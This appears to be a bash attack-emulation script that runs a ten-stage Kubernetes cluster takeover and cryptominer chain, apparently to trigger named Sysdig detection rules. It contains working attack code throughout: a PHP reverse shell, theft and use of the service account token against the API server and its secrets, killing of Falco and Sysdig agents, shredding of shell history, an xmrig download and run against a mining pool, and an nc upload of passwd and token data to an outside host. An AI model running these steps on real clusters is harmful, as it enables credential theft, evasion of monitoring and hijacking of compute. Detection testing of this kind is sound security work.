#!/bin/bash

# K8s Cluster Takeover + Cryptominer deployment (10 stages)
# Sysdig rules triggered per stage:
#   1  Reverse Shell Detected
#   2  System Geolocation Discovery + Reconnaissance attempt to find SUID binaries
#   3  Read K8s Service Account Token from Terminal
#   4  Suspicious Connection to K8S API Server From Container
#   5  Read Shell Configuration File + Write below binary dir
#   6  Create Symlink Over Sensitive Files
#   7  Tampering with Security Software in Container + Delete or rename shell history
#   8  Detect crypto miners using the Stratum protocol + DNS Lookup for Offensive Security Tool Domain Detected
#   9  Execute Crypto Currency Miner (xmrig)
#  10  Network Relay Binary Exfiltration Activities Detected

log() {
    echo -e "$(date +"%Y-%m-%d %H:%M:%S") \e[92m[K8S-TAKEOVER] $1\033[m"
}

sleep_step() {
    sleep "${1:-4}"
}

# ── Stage 1: Initial Access — Reverse Shell ───────────────────────────────────
log "Stage 1/10 | Initial Access - Reverse shell via PHP over K8s DNS"
export NS=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | head -1)
php -r '$ip=getenv("NS");$sock=@fsockopen($ip,53);exec("/bin/sh -1 <&3 >&3 2>&3");' 2>/dev/null || true
sleep_step 4

# ── Stage 2: Discovery — Geolocation + SUID Enumeration ──────────────────────
log "Stage 2/10 | Discovery - System geolocation recon and SUID binary enumeration"
wget -q -O /tmp/.geoinfo ipinfo.io 2>/dev/null || curl -m5 -s -o /tmp/.geoinfo ipinfo.io 2>/dev/null || true
find / -perm -4000 -type f ! -path "/dev/*" 2>/dev/null | head -20 || true
cat /etc/hostname > /dev/null 2>/dev/null || true
cat /etc/os-release > /dev/null 2>/dev/null || true
sleep_step 4

# ── Stage 3: Credential Access — K8s Service Account Token ───────────────────
log "Stage 3/10 | Credential Access - Reading K8s service account token"
TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
if [ ! -f "$TOKEN_PATH" ]; then
    mkdir -p "$(dirname $TOKEN_PATH)"
    echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.stub" > "$TOKEN_PATH"
fi
# Run cat inside a pseudo-terminal (script -c) so proc.tty != 0, satisfying the rule condition
script -q -c "cat $TOKEN_PATH" /dev/null 2>/dev/null || cat "$TOKEN_PATH"
TOKEN=$(< "$TOKEN_PATH")
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > /dev/null 2>/dev/null || true
find / -name "*.pem" -o -name "*.key" 2>/dev/null | head -5 || true
sleep_step 4

# ── Stage 4: K8s API Enumeration — Cluster Takeover ──────────────────────────
log "Stage 4/10 | K8s API Enumeration - Querying Kubernetes API server with stolen token"
# Use KUBERNETES_SERVICE_HOST (injected IP) so Sysdig catches the direct API server connection
K8S_HOST="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc.cluster.local}"
K8S_PORT="${KUBERNETES_SERVICE_PORT_HTTPS:-443}"
APISERVER="https://${K8S_HOST}:${K8S_PORT}"
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -sk "$APISERVER/api/v1/namespaces" \
    --header "Authorization: Bearer $TOKEN" \
    --cacert "$CA_CERT" 2>/dev/null | head -c 512 || true
curl -sk "$APISERVER/api/v1/namespaces/default/pods" \
    --header "Authorization: Bearer $TOKEN" \
    --cacert "$CA_CERT" 2>/dev/null | head -c 512 || true
# Python3 urllib is less likely to be in Sysdig's process whitelist than curl
python3 -c "
import ssl, urllib.request, os
ctx = ssl._create_unverified_context()
h = os.environ.get('KUBERNETES_SERVICE_HOST', '')
p = os.environ.get('KUBERNETES_SERVICE_PORT_HTTPS', '443')
tok = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read() if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token') else ''
if h:
    for path in ['/api/v1/namespaces', '/api/v1/namespaces/default/secrets', '/api/v1/namespaces/default/pods']:
        try:
            req = urllib.request.Request('https://{}:{}{}'.format(h,p,path), headers={'Authorization': 'Bearer ' + tok})
            urllib.request.urlopen(req, context=ctx, timeout=3)
        except Exception: pass
" 2>/dev/null || true
# Also try kubectl if available
kubectl get pods --all-namespaces 2>/dev/null || true
sleep_step 4

# ── Stage 5: Privilege Escalation — Shell Config Read + Binary Dir Write ─────
log "Stage 5/10 | Privilege Escalation - Reading shell config files and writing below binary dir"
# Reading shell config files triggers "Read Shell Configuration File"
cat /etc/bash.bashrc 2>/dev/null || true
cat /etc/profile 2>/dev/null || true
cat /root/.bashrc 2>/dev/null || true
# Writing below binary dir triggers "Modify binary dirs"
touch /usr/local/bin/.k8s_backdoor 2>/dev/null || true
touch /usr/bin/.hidden_agent 2>/dev/null || true
sleep_step 4

# ── Stage 6: Persistence — Symlink Over Sensitive Files ──────────────────────
log "Stage 6/10 | Persistence - Creating symlinks over sensitive files"
ln -sf /etc/shadow /tmp/.symlink_shadow 2>/dev/null || true
ln -sf /etc/passwd /tmp/.symlink_passwd 2>/dev/null || true
ln -sf /etc/kubernetes/admin.conf /tmp/.symlink_kubeconf 2>/dev/null || true
sleep_step 4

# ── Stage 7: Defence Evasion — Tamper Security + Clear History ───────────────
log "Stage 7/10 | Defence Evasion - Tampering with security software and clearing shell history"
sysctl kernel.nmi_watchdog=0 2>/dev/null || true
kill -9 $(pgrep -f "falco" 2>/dev/null) 2>/dev/null || true
kill -9 $(pgrep -f "sysdig-agent" 2>/dev/null) 2>/dev/null || true
# Create file first so rm/shred triggers "Delete or rename shell history" (file must exist)
touch ~/.bash_history 2>/dev/null || true
rm -f ~/.bash_history 2>/dev/null || true
shred -u /root/.bash_history 2>/dev/null || true
unset HISTFILE 2>/dev/null || true
rm -f /tmp/.geoinfo /tmp/.symlink_shadow /tmp/.symlink_passwd \
       /tmp/.symlink_kubeconf 2>/dev/null || true
sleep_step 4

# ── Stage 8: C2 Beaconing — Stratum + Offensive DNS ─────────────────────────
log "Stage 8/10 | C2 Beaconing - Stratum protocol and offensive-tool DNS lookup"
cgminer -o stratum+tcp://xmr.pool.minergate.com:45700 -u miner -p x 2>/dev/null || true
tempdn=$(shuf -i 0-9 -n 6 --repeat | tr -d '\n')
curl -m5 -o /dev/null "$tempdn.oastify.com" 2>/dev/null || true
curl -m5 -s -o /dev/null tst.xmr.pool.minergate.com 2>/dev/null || true
sleep_step 4

# ── Stage 9: Cryptominer Deployment — xmrig ──────────────────────────────────
log "Stage 9/10 | Cryptominer Deployment - Downloading and executing xmrig"
wget -q https://github.com/sysdig/TR-Blogs/raw/main/xmrig-upx-linux-static-x64.tar \
    -O /tmp/xmrig.tar.gz 2>/dev/null || \
    curl -fsSL https://github.com/sysdig/TR-Blogs/raw/main/xmrig-upx-linux-static-x64.tar \
    -o /tmp/xmrig.tar.gz 2>/dev/null || true
tar -xf /tmp/xmrig.tar.gz -C /tmp 2>/dev/null || true
chmod +x /tmp/xmrig-6.18.0/xmrig 2>/dev/null || true
/tmp/xmrig-6.18.0/xmrig --donate-level 1 -o stratum+tcp://xmr.pool.minergate.com:45700 \
    -u miner -p x --no-color 2>/dev/null &
sleep 5
pkill -i xmrig 2>/dev/null || true
rm -f /tmp/xmrig.tar.gz 2>/dev/null || true
rm -rf /tmp/xmrig-6.18.0 2>/dev/null || true
sleep_step 2

# ── Stage 10: Exfiltration — Network Relay ───────────────────────────────────
log "Stage 10/10 | Exfiltration - Staging credentials and exfiltrating via network relay"
tar czf /tmp/.exfil_k8s.tar.gz /etc/passwd /etc/hostname \
    /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true
nc -w3 -q0 sysdig.com 80 < /tmp/.exfil_k8s.tar.gz > /dev/null 2>/dev/null || true
rm -f /tmp/.exfil_k8s.tar.gz /usr/local/bin/.k8s_backdoor \
       /usr/bin/.hidden_agent 2>/dev/null || true

log "Attack chain complete - K8s cluster takeover + cryptominer all 10 stages executed"
